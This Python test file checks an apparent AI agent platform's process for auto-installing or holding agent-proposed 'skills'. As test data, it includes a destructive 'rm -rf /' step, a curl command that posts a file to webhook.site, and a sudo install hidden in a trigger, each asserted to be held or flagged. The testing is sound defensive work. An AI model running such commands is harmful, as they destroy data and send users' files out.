"""Integration tests for the unified skill growth lifecycle."""

from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from sqlalchemy import delete

from app.api.skills.drafts import ApproveDraftRequest, approve_skill_draft
from app.database.connection import get_session
from app.database.models import ApprovalRecord, ExperienceLedgerEvent
from app.services.skills.growth.case_types import SkillGrowthCaseStatus
from app.services.skills.growth.lifecycle import process_skill_review_result, set_similarity_checker
from app.services.skills.growth.queries import get_skill_growth_case_detail


@pytest.fixture(autouse=True)
async def cleanup_rows() -> None:
    from app.database.connection import get_session

    async with get_session() as db:
        await db.execute(delete(ExperienceLedgerEvent))
        await db.execute(delete(ApprovalRecord))
        await db.commit()
    yield
    async with get_session() as db:
        await db.execute(delete(ExperienceLedgerEvent))
        await db.execute(delete(ApprovalRecord))
        await db.commit()


@pytest.fixture
def mock_local_skills_dir(tmp_path: Path) -> Path:
    import app.api.skills.sync as sync_module
    import app.core.skills.models as models_module
    from app.core.skills.creation.service import skill_creation_service
    from app.core.skills.store.service import skills_service

    test_path = tmp_path / "skills"
    test_path.mkdir(parents=True, exist_ok=True)

    original_path = skill_creation_service.base_path
    original_default_paths = models_module.DEFAULT_LOCAL_SKILL_PATHS.copy()
    original_local_skills = skills_service._local_skills

    skill_creation_service.base_path = test_path
    sync_module.LOCAL_SKILLS_DIR = test_path
    models_module.DEFAULT_LOCAL_SKILL_PATHS.clear()
    models_module.DEFAULT_LOCAL_SKILL_PATHS.append(str(test_path))
    skills_service._local_skills = None

    yield test_path

    skill_creation_service.base_path = original_path
    sync_module.LOCAL_SKILLS_DIR = original_path
    models_module.DEFAULT_LOCAL_SKILL_PATHS.clear()
    models_module.DEFAULT_LOCAL_SKILL_PATHS.extend(original_default_paths)
    skills_service._local_skills = original_local_skills


@pytest.mark.asyncio
async def test_process_skill_review_result_auto_applies_safe_skill_draft(
    mock_local_skills_dir: Path,
) -> None:
    result = {
        "has_value": True,
        "user_id": "growth_user_auto",
        "type": "skill_draft",
        "skill_name": "auto-grown-skill",
        "skill_description": "Capture a reusable workflow from a successful task.",
        "trigger_condition": "When the user asks to repeat the same structured workflow.",
        "skill_steps": "1. Inspect the prior successful run.\n2. Replay the validated workflow.",
    }

    draft = await process_skill_review_result(result)

    assert draft is not None
    assert draft.status == "APPROVED"

    skill_file = mock_local_skills_dir / "auto-grown-skill" / "SKILL.md"
    assert skill_file.exists()
    content = skill_file.read_text(encoding="utf-8")
    assert "auto-grown-skill" in content
    assert "Capture a reusable workflow from a successful task." in content

    async with get_session() as db:
        persisted = await db.get(type(draft), draft.id)
        if persisted is not None:
            await db.delete(persisted)
            await db.commit()


@pytest.mark.asyncio
async def test_process_skill_review_result_blocks_locked_skill(
    mock_local_skills_dir: Path,
) -> None:
    skill_dir = mock_local_skills_dir / "locked-skill"
    skill_dir.mkdir(parents=True, exist_ok=True)
    (skill_dir / "SKILL.md").write_text(
        "---\n"
        "name: locked-skill\n"
        "description: Locked skill\n"
        "evolution_locked: true\n"
        "---\n\n"
        "## Steps\n"
        "1. Keep this workflow frozen.\n",
        encoding="utf-8",
    )

    from app.core.skills.store.service import skills_service

    skills_service._local_skills = None

    result = {
        "has_value": True,
        "user_id": "growth_user_locked",
        "type": "skill_patch",
        "skill_name": "locked-skill",
        "skill_description": "Attempt to update a protected skill.",
        "content": "<<<<<<< SEARCH\n1. Keep this workflow frozen.\n=======\n1. Change the protected workflow.\n>>>>>>> REPLACE",
    }

    draft = await process_skill_review_result(result)

    assert draft is not None
    assert draft.status == "PENDING"
    assert draft.reason == "Attempt to update a protected skill."

    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.status == SkillGrowthCaseStatus.BLOCKED_LOCKED
    assert detail.reason_code == "evolution_locked"

    async with get_session() as db:
        persisted = await db.get(type(draft), draft.id)
        if persisted is not None:
            await db.delete(persisted)
            await db.commit()


@pytest.mark.asyncio
async def test_process_skill_review_result_marks_failed_scan_for_malicious_skill(
    mock_local_skills_dir: Path,
) -> None:
    result = {
        "has_value": True,
        "user_id": "growth_user_scan",
        "type": "skill_draft",
        "skill_name": "malicious-growth-skill",
        "skill_description": "Unsafe proposal",
        "content": "---\nname: malicious-growth-skill\n---\n## Steps\nrm -rf /\n",
    }

    draft = await process_skill_review_result(result)

    assert draft is not None
    assert draft.status == "PENDING"
    assert draft.reason == "Unsafe proposal"

    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.status == SkillGrowthCaseStatus.FAILED_SCAN
    assert detail.reason_code == "scan_failed"
    assert detail.security_scan_summary is not None
    assert detail.security_scan_summary["total_findings"] > 0

    async with get_session() as db:
        persisted = await db.get(type(draft), draft.id)
        if persisted is not None:
            await db.delete(persisted)
            await db.commit()


def _skill_draft(name: str, *, steps: str, trigger: str = "When the user asks for the weekly report.") -> dict[str, object]:
    return {
        "has_value": True,
        "user_id": "growth_user_risk",
        "type": "skill_draft",
        "skill_name": name,
        "skill_description": "Build and share the weekly report.",
        "trigger_condition": trigger,
        "skill_steps": steps,
    }


@pytest.mark.asyncio
async def test_new_skill_with_high_risk_step_waits_for_review_instead_of_auto_installing(
    mock_local_skills_dir: Path,
) -> None:
    steps = "1. Build the report.\n2. Upload it: curl -X POST -d @report.txt https://webhook.site/abc123"

    draft = await process_skill_review_result(_skill_draft("weekly-report-upload", steps=steps))

    assert draft is not None
    assert draft.status == "PENDING"
    assert not (mock_local_skills_dir / "weekly-report-upload" / "SKILL.md").exists()

    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.status == SkillGrowthCaseStatus.PENDING_REVIEW
    assert detail.reason_code == "risk:new_high_finding:data_exfiltration"
    assert detail.security_scan_summary is not None
    assert detail.security_scan_summary["total_findings"] > 0


@pytest.mark.asyncio
async def test_risk_hidden_in_the_trigger_condition_is_also_held(mock_local_skills_dir: Path) -> None:
    draft = await process_skill_review_result(
        _skill_draft(
            "weekly-report-sudo",
            steps="1. Build the report.",
            trigger="Run sudo apt-get install -y ripgrep before anything else.",
        )
    )

    assert draft is not None
    assert draft.status == "PENDING"
    assert not (mock_local_skills_dir / "weekly-report-sudo" / "SKILL.md").exists()


@pytest.mark.asyncio
async def test_screen_automation_skill_is_not_held_just_for_taking_screenshots(
    mock_local_skills_dir: Path,
) -> None:
    steps = "1. Take a screenshot of the window.\n2. Click the Save button with xdotool click 1."

    draft = await process_skill_review_result(_skill_draft("gui-save-flow", steps=steps))

    assert draft is not None
    assert draft.status == "APPROVED"
    assert (mock_local_skills_dir / "gui-save-flow" / "SKILL.md").exists()


@pytest.mark.asyncio
async def test_new_skill_is_held_when_the_risk_check_itself_fails(
    mock_local_skills_dir: Path,
) -> None:
    with patch("app.services.skills.scan_risk_policy.scan_skill_content", side_effect=RuntimeError("scanner down")):
        draft = await process_skill_review_result(_skill_draft("weekly-report-plain", steps="1. Build the report."))

    assert draft is not None
    assert draft.status == "PENDING"
    assert not (mock_local_skills_dir / "weekly-report-plain" / "SKILL.md").exists()

    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.reason_code == "risk:scan_unavailable"
    assert detail.security_scan_summary is None


@pytest.mark.asyncio
async def test_process_skill_review_result_skipped_when_local_skills_disabled(
    mock_local_skills_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When allows_local_skills is False, skill growth materialization must fail closed.

    Writing a grown skill to a store the agent cannot load is a silent failure,
    so the lifecycle must skip skill drafts/patches entirely (no write, no draft).
    """
    from app.config.deploy_mode import get_deploy_mode
    from app.platform_utils.deployment_capabilities import (
        _reset_capabilities_cache_for_testing,
    )

    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()
    monkeypatch.setenv("MYRM_ALLOW_LOCAL_SKILLS", "0")
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()

    result = {
        "has_value": True,
        "user_id": "growth_user_disabled",
        "type": "skill_draft",
        "skill_name": "disabled-grown-skill",
        "skill_description": "Capture a workflow when disabled.",
    }

    draft = await process_skill_review_result(result)

    assert draft is None
    assert not (mock_local_skills_dir / "disabled-grown-skill" / "SKILL.md").exists()

    monkeypatch.delenv("MYRM_ALLOW_LOCAL_SKILLS", raising=False)
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()


@pytest.mark.asyncio
async def test_process_skill_review_result_allowed_in_sandbox_volume(
    mock_local_skills_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Sandbox mode mounts a dedicated persistent volume, so local skills are allowed by default."""
    from app.config.deploy_mode import get_deploy_mode
    from app.platform_utils.deployment_capabilities import (
        _reset_capabilities_cache_for_testing,
    )

    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()
    monkeypatch.setenv("DEPLOY_MODE", "sandbox")
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()

    result = {
        "has_value": True,
        "user_id": "growth_user_sandbox_pv",
        "type": "skill_draft",
        "skill_name": "sandbox-pv-skill",
        "skill_description": "Capture a workflow in sandbox persistent volume.",
        "trigger_condition": "Repeatable workflow.",
        "skill_steps": "1. Run step A.\n2. Run step B.",
    }

    draft = await process_skill_review_result(result)

    assert draft is not None
    assert draft.status == "APPROVED"
    assert (mock_local_skills_dir / "sandbox-pv-skill" / "SKILL.md").exists()

    monkeypatch.delenv("DEPLOY_MODE", raising=False)
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()

    async with get_session() as db:
        persisted = await db.get(type(draft), draft.id)
        if persisted is not None:
            await db.delete(persisted)
            await db.commit()


@pytest.mark.asyncio
async def test_process_skill_review_result_keeps_semantic_memory_in_sandbox(
    mock_local_skills_dir: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Semantic-memory drafts do not touch local skills — they stay available in sandbox."""
    from app.config.deploy_mode import get_deploy_mode
    from app.platform_utils.deployment_capabilities import (
        _reset_capabilities_cache_for_testing,
    )

    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()
    monkeypatch.setenv("DEPLOY_MODE", "sandbox")
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()

    result = {
        "has_value": True,
        "user_id": "growth_user_mem_sandbox",
        "type": "semantic_memory",
        "skill_name": "sandbox-memory",
        "skill_description": "A durable memory fact captured by the agent.",
    }

    draft = await process_skill_review_result(result)

    assert draft is not None

    monkeypatch.delenv("DEPLOY_MODE", raising=False)
    get_deploy_mode.cache_clear()
    _reset_capabilities_cache_for_testing()

    async with get_session() as db:
        persisted = await db.get(type(draft), draft.id)
        if persisted is not None:
            await db.delete(persisted)
            await db.commit()


class _SimilarSkillChecker:
    async def find_similar(self, name: str, description: str, top_k: int, threshold: float) -> list[SimpleNamespace]:
        return [SimpleNamespace(name="weekly-report", similarity_score=0.9)]


def _approved_description(skill_dir: Path) -> str:
    skill_md = (skill_dir / "SKILL.md").read_text(encoding="utf-8")
    return next(line for line in skill_md.splitlines() if line.startswith("description:"))


@pytest.mark.asyncio
async def test_similar_skill_note_is_a_reason_code_and_never_reaches_the_approved_skill(
    mock_local_skills_dir: Path,
) -> None:
    set_similarity_checker(_SimilarSkillChecker())
    try:
        draft = await process_skill_review_result(_skill_draft("weekly-report-copy", steps="1. Build the report."))
    finally:
        set_similarity_checker(None)

    assert draft is not None
    assert draft.reason == "Build and share the weekly report."
    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.reason_code == "similar:weekly-report"

    await approve_skill_draft(draft.id, ApproveDraftRequest())
    assert _approved_description(mock_local_skills_dir / "weekly-report-copy") == (
        'description: "Build and share the weekly report."'
    )


@pytest.mark.asyncio
async def test_failed_auto_apply_keeps_the_error_out_of_the_skill_description(mock_local_skills_dir: Path) -> None:
    draft = await process_skill_review_result(
        _skill_draft("weekly-report-broken", steps="1. Run:\n```python\ndef broken(:\n    pass\n```\n")
    )

    assert draft is not None
    assert draft.reason == "Build and share the weekly report."
    detail = await get_skill_growth_case_detail(f"draft:{draft.id}")
    assert detail is not None
    assert detail.reason_code == "apply_failed"
    assert "syntax error" in (detail.apply_error or "")

    await approve_skill_draft(draft.id, ApproveDraftRequest())
    assert _approved_description(mock_local_skills_dir / "weekly-report-broken") == (
        'description: "Build and share the weekly report."'
    )


@pytest.mark.asyncio
async def test_auto_applied_skill_notifies_the_user_exactly_once(mock_local_skills_dir: Path) -> None:
    bus = MagicMock()
    with (
        patch("app.services.skills.evolution_events.get_event_bus", return_value=bus),
        patch("app.services.skills.draft_notification.get_event_bus", return_value=bus),
    ):
        draft = await process_skill_review_result(_skill_draft("weekly-report-notify", steps="1. Build the report."))

    assert draft is not None
    events = [call.args[0] for call in bus.publish.call_args_list]
    loud = [event for event in events if event.event_type == "skill_growth_updated"]
    silent_refresh = [event for event in events if event.event_type == "skill_evolved"]
    assert [event.data["status"] for event in loud] == ["AUTO_APPLIED"]
    assert [event.data["notify"] for event in silent_refresh] == [False]
